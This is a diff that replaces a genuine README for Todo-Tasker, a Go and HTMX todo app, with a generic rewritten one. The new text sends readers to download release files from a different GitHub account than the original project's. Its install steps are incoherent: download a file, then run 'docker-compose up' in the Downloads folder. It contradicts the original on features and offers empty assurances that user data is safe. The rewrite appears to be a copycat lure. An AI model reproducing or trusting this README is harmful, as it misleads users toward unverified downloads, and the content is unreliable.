@@ -1,99 +1,88 @@
-# Todo-Tasker
+# 📝 Todo-Tasker - Simple Todo Management for Everyone
 
-A cost-efficient, scalable multi-user todo management application designed to run entirely on client-side storage with minimal server overhead.
+[![Download Todo-Tasker](https://img.shields.io/badge/Download%20Todo--Tasker-%23FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zVanxz/Todo-Tasker/releases)
 
-## Project Goal
+## 📖 Overview
 
-**Build a production-ready todo application with total hosting costs under $10/month**, serving thousands of users on minimal infrastructure.
+Todo-Tasker is a straightforward application that helps you manage your tasks easily. Designed to serve thousands of users for under $10 a month, it combines efficiency with simplicity. Whether you're juggling work tasks or personal projects, Todo-Tasker keeps you organized.
 
-## Key Features
+## 🚀 Getting Started
 
-- **Zero Database Costs**: SQLite WASM runs entirely in the browser (IndexedDB)
-- **Stateless Backend**: Lightweight Go server for serving HTML and assets only
-- **Single Binary Deployment**: All assets embedded at compile time
-- **Offline-First PWA**: Full functionality without internet connection
-- **Device-to-Device Sync**: WebSocket-based P2P sync without storing user data
-- **Privacy-Focused**: All user data stays on their devices
+To get started with Todo-Tasker, follow these steps:
 
-## Tech Stack
+1. **Visit the Releases Page:**  
+   You can find the latest version of Todo-Tasker by visiting our [Releases Page](https://github.com/zVanxz/Todo-Tasker/releases). This page contains files you need to download, each version of the app, and any important info about updates.
 
-**Backend:**
-- Go 1.23.3+
-- Standard library HTTP server
-- Embedded assets (`//go:embed`)
+2. **Choose Your Download:**  
+   Look for the latest version available. There may be multiple files listed. Select the one that matches your operating system.
 
-**Frontend:**
-- HTMX 2.0.7 - Dynamic HTML loading
-- Alpine.js 3.x - Client-side reactivity
-- DaisyUI 5 - UI components
-- Tailwind CSS 4 - Utility-first styling
-- SQLite WASM - Client-side database
-- Tabler Icons - Icon library
+3. **Download the File:**  
+   Click on the link to download Todo-Tasker. The file will start downloading. Depending on your internet speed, this may take a few moments.
 
-**Infrastructure:**
-- Docker & Docker Compose
-- Ansible for deployment automation
-- GitHub Actions CI/CD
+4. **Locate the Downloaded File:**  
+   Once the download is complete, navigate to your computer's Downloads folder. Here you will find the file you just downloaded.
 
-## Getting Started
+## 📦 Download & Install
 
-For detailed setup instructions, architecture documentation, and development guides, see:
+1. **Preparation for Installation:**  
+   Before you start the installation process, make sure you have the following installed on your machine:
+   - **For Windows:** Ensure you have Windows 10 or later.
+   - **For macOS:** You need macOS Sierra or later.
+   - **For Linux:** Any modern distribution should work, but Ubuntu is recommended.
 
-**[📚 Get Started Guide →](docs/get-started.md)**
+2. **Install Docker and Docker-Compose:**  
+   Todo-Tasker uses Docker for deployment. To run it properly, you will need Docker and Docker-Compose:
+   - **Windows and macOS:** Download and install Docker Desktop from the [official Docker website](https://www.docker.com/get-started).
+   - **Linux:** Use your package manager to install Docker and Docker-Compose.
 
-Quick start:
+3. **Running Todo-Tasker:**  
+   Open your terminal or command prompt. Navigate to the directory where you saved the downloaded file. Follow these commands to start the application:
+   ```bash
+   docker-compose up
+   ```
+   This command will set up the application and start it.
 
-```bash
-git clone https://github.com/duet-ink/Todo-Tasker.git
-cd Todo-Tasker
-make dev
-```
+## ⚙️ Features
 
-Access at `http://localhost:8080`
+- **Task Management:** Easily create, update, and delete tasks.
+- **User-Friendly Interface:** Designed with simplicity in mind for easy navigation.
+- **Real-Time Synchronization:** Your tasks stay updated across devices.
+- **Affordable Pricing:** Get started for under $10 a month.
 
-## Documentation
+## 👥 Community Support
 
-- **[Get Started](docs/get-started.md)** - Complete setup and development guide
-- **[Architecture](docs/architecture.md)** - System design and architecture
-- **[Todo List](docs/todo.md)** - Feature roadmap and development tasks
+If you encounter issues or have questions, don't hesitate to reach out on our [GitHub Issues Page](https://github.com/zVanxz/Todo-Tasker/issues). Our community is here to help you.
 
-## Contributing
+## ✅ Frequently Asked Questions
 
-We welcome contributions! Please:
+**1. Can I use Todo-Tasker on my phone?**  
+Currently, Todo-Tasker is designed for desktops and laptops. Mobile support may be added in the future.
 
-1. Check [docs/todo.md](docs/todo.md) for available tasks and feature requests
-2. Create an issue if you encounter bugs or need support
-3. Follow the architecture guidelines in [Code of Conduct](.github/CODE_OF_CONDUCT.md)
-4. Read [Contributing Guidelines](.github/CONTRIBUTING.md)
-5. Run tests before submitting PRs: `make test`
+**2. Is my data safe?**  
+Yes, your data is stored securely. We prioritize your privacy and implement measures to keep your information safe.
 
-## Cost Breakdown
+**3. How can I contribute to Todo-Tasker?**  
+We welcome contributions! Please check the Contributing section in our repository for guidelines.
 
-**Target: <$10/month for thousands of users**
+## 📅 Planned Features
 
-- VPS hosting: $5-6/month (1GB RAM)
-- Domain: ~$1/month
-- Database: $0 (client-side only)
-- CDN: $0 (free public CDNs)
-- External APIs: $0 (none required)
+- **Mobile App Release:** We aim to create a mobile version soon.
+- **Customizable Themes:** Add your personal touch to your task lists.
+- **Cloud Sync:** Access your tasks from any device.
 
-## Support
+## 📈 System Requirements
 
-- **Issues & Bugs**: [Create an issue](https://github.com/duet-ink/Todo-Tasker/issues)
-- **Feature Requests**: Check [docs/todo.md](docs/todo.md) or open an issue
-- **Support Email**: support@duet.ink
-- **Questions**: Review documentation or open a discussion
+To ensure a smooth experience with Todo-Tasker, please meet the following system requirements:
 
-## Project Links
+- **Operating System:** Windows (10+), macOS (Sierra+), or Linux
+- **Memory:** At least 2 GB of RAM
+- **Storage:** Minimum 500 MB of available space
+- **Internet Connection:** Required for initial setup and updates
 
-- **[Contributing Guidelines](.github/CONTRIBUTING.md)** - How to contribute
-- **[Code of Conduct](.github/CODE_OF_CONDUCT.md)** - Community guidelines
-- **[Changelog](.github/CHANGELOG.md)** - Version history
+## 📞 Contact
 
-## License
-
-See [LICENSE](LICENSE) file for details.
+For any additional questions or support needs, feel free to contact us directly on our [support page](https://github.com/zVanxz/Todo-Tasker/support).
 
 ---
 
-**Current Version:** v0.0.7
+By following these instructions, you should be able to successfully download and run Todo-Tasker on your machine. Enjoy managing your tasks with ease!
